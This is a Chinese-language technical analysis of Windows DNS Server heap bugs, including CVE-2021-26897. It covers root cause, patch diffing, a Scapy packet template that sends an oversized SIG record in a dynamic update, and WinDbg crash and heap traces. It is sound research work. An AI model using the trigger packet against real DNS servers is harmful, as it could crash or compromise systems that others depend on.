### 漏洞分析

在 `CopyWireRead` 函数中，通过 `RR_AllocateEx` 函数申请长度为 `data length` 的空间。然而，在后续操作中实际上会分配 `data length + 0x38 + 0x10` 大小的空间。其中，`0x10` 为自定义头部的大小，`0x38` 为 RR 头部的大小。`result` 指向 RR 头部，然后调用 `memcpy` 函数将 `data length` 长度的数据复制到缓冲区中。如果 `data` 的实际长度大于 `data length`，多余的数据会被截断。

接下来，在 `TxtFileWrite` 函数中，会调用 `File_PlaceStringInFileBuffer` 函数，分别传入待写入缓冲区地址、待写入缓冲区结尾地址、`1`、TXT 记录缓存地址以及分组长度（每次不超过 `0xFF`）。这个长度是从 `data` 字段中提取的，在调用 `File_PlaceStringInFileBuffer` 函数前没有进行边界检查（函数内部也没有检查）。尽管在后面有判断（粉框内），但在第一次执行 `File_PlaceStringInFileBuffer` 函数的过程中就有可能触发漏洞。

在 `File_PlaceStringInFileBuffer` 函数中，存在一个循环，使用传入的 `length` 控制循环次数，这会导致访问超出边界的数据。

### 补丁分析

补丁后的 `TxtFileWrite` 函数在调用 `File_PlaceStringInFileBuffer` 函数前，会判断通过 `TXT Length` 寻址后的地址是否超出了申请的空间。

### CVE-2021-26897 漏洞复现分析

* 发送许多连续的 SIG 资源记录动态更新可以触发此漏洞。
* 将许多连续的 SIG 资源记录动态更新进行组合并将字符串进行 Base64 编码时，会在堆上引发 OOB 写操作。

根据已有信息，可构造以下数据包。更新类型为 SIG，记录超长（`signature` 字段超长）。注意这次需使用 TCP 连接，Scapy 不能直接构造，以下仅为模型：

```python
query = DNSQR(qname='mal', qtype='SOA')
RRSIG = DNSRRRSIG(rrname=str(RandString(8)) + '.mal', type="SIG", ttl=300, signersname="A.mal", signature='\x00' * 0xff00)
packet = IP(dst=ip) / TCP() / DNS(id=random.randint(0, 65535), opcode=5, qd=query, ns=RRSIG)
```

以下为抓包数据：

漏洞触发现场以及函数调用堆栈如下，异常的原因是 `0x2713533c000` 无法访问。漏洞触发是在 `Dns_SecurityKeyToBase64String` 函数（用于 Base64 编码）中。

```
(874.c34): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
dns!Dns_SecurityKeyToBase64String+0x66:
00007ff7`50d02c3a 41884001        mov     byte ptr [r8+1],al ds:00000271`3533c000=??
```

函数调用堆栈：

```
00 000000bc`b867f3a8 00007ff7`50cc7f02 dns!Dns_SecurityKeyToBase64String+0x66
01 000000bc`b867f3b0 00007ff7`50bc26a9 dns!SigFileWrite+0x1f2
02 000000bc`b867f4a0 00007ff7`50bc244e dns!RR_WriteToFile+0x205
03 000000bc`b867f500 00007ff7`50bc1c92 dns!writeNodeRecordsToFile+0xa6
04 000000bc`b867f560 00007ff7`50bc1cb1 dns!zoneTraverseAndWriteToFile+0x42
05 000000bc`b867f590 00007ff7`50bc18f5 dns!zoneTraverseAndWriteToFile+0x61
06 000000bc`b867f5c0 00007ff7`50c6a2a3 dns!File_WriteZoneToFile+0x379
07 000000bc`b867f6c0 00007ff7`50c6a388 dns!Zone_WriteBack+0xfb
08 000000bc`b867f700 00007ff7`50d00580 dns!Zone_WriteBackDirtyZones+0xb4
09 000000bc`b867f790 00007ff7`50c56a74 dns!Zone_WriteBackDirtyVirtualizationInstances+0x110
0a 000000bc`b867f7c0 00007ff7`50c550ad dns!Timeout_Thread+0x544
```

查看出现问题的缓冲区，其首地址为 `0x271352bbff0`，`UserSize` 为 `0x80010`，是在 `File_WriteZoneToFile` 函数中调用 `Mem_Alloc` 分配的。

```
0:011> !heap -p -a 271`3533c000
address 000002713533c000 found in
_DPH_HEAP_ROOT @ 271126b1000
in busy allocation (  DPH_HEAP_BLOCK:         UserAddr         UserSize -         VirtAddr         VirtSize)
                             27132a2ca90:      271352bbff0            80010 -      271352bb000            82000
00007fff07e86d67 ntdll!RtlDebugAllocateHeap+0x000000000000003f
00007fff07e2cade ntdll!RtlpAllocateHeap+0x000000000009d27e
00007fff07d8da21 ntdll!RtlpAllocateHeapInternal+0x0000000000000991
00007ff750cc2b4d dns!allocMemory+0x0000000000000039
00007ff750cc2f28 dns!Mem_Alloc+0x000000000000008c
00007ff750bc178c dns!File_WriteZoneToFile+0x0000000000000210
00007ff750c6a2a3 dns!Zone_WriteBack+0x00000000000000fb
00007ff750c6a388 dns!Zone_WriteBackDirtyZones+0x00000000000000b4
00007ff750d00580 dns!Zone_WriteBackDirtyVirtualizationInstances+0x0000000000000110
00007ff750c56a74 dns!Timeout_Thread+0x0000000000000544
00007ff750c550ad dns!threadTopFunction+0x000000000000007d
00007fff054a7974 KERNEL32!BaseThreadInitThunk+0x0000000000000014
00007fff07dea271 ntdll!RtlUserThreadStart+0x0000000000000021
0:011> db 271352bbff0    //存放 MAL.dns 缓存信息
00000271`352bbff0  c0 c0 c0 c0 bb 16 fc ff-ef 0c 0c 0c 0c 0c 0c fe  ................
00000271`352bc000  3b 0d 0a 3b 20 20 44 61-74 61 62 61 73 65 20 66  ;..;  Database f
00000271`352bc010  69 6c 65 20 4d 41 4c 2e-64 6e 73 20 66 6f 72 20  ile MAL.dns for 
00000271`352bc020  44 65 66 61 75 6c 74 20-7a 6f 6e 65 20 73 63 6f  Default zone sco
00000271`352bc030  70 65 20 69 6e 20 7a 6f-6e 65 20 4d 41 4c 2e 0d  pe in zone MAL..
00000271`352bc040  0a 3b 20 20 20 20 20 20-5a 6f 6e 65 20 76 65 72  .;      Zone ver
00000271`352bc050  73 69 6f 6e 3a 20 20 32-35 0d 0a 3b 0d 0a 0d 0a  sion:  25..;....
00000271`352bc060  40 20 20 20 20 20 20 20-20 20 20 20 20 20 20 20  @
```

`File_WriteZoneToFile` 函数中调用 `Mem_Alloc` 申请大小为 `0x80000` 长度的空间，实际是通过 `allocMemory` 函数申请大小为 `0x80010` 长度的堆（包括 `0x10` 大小的头部长度）。而触发访问异常的 `0x2713533c000` 正好和 `0x271352bbff0` 相差 `0x80010`。下一步要查看为何会有超出边界的数据复制过来。

```
0:011> ?271`3533c000-271352bbff0
Evaluate expression: 524304 = 00000000`00080010
```

### 深入分析

通过回溯及数据跟踪，重点关注 `zoneTraverseAndWriteToFile` 函数。该函数的第一个参数偏移 `0x20` 处保存了待写缓冲区的实时地址。该函数会调用 `writeZoneRoot` 和 `writeNodeRecordsToFile` 等函数向缓冲区写入数据。然后利用 `NTree_FirstChild` 和 `NTree_NextSiblingWithLocking` 函数遍历 `NodeRecords`，并通过回调依次对这些节点进行处理。如果该节点偏移 `0x5c` 处没有设置 `0x10` 的标志位，就会调用 `writeNodeRecordsToFile` 函数进行处理。

在 `writeNodeRecordsToFile` 函数中，会调用 `RR_WriteToFile` 函数。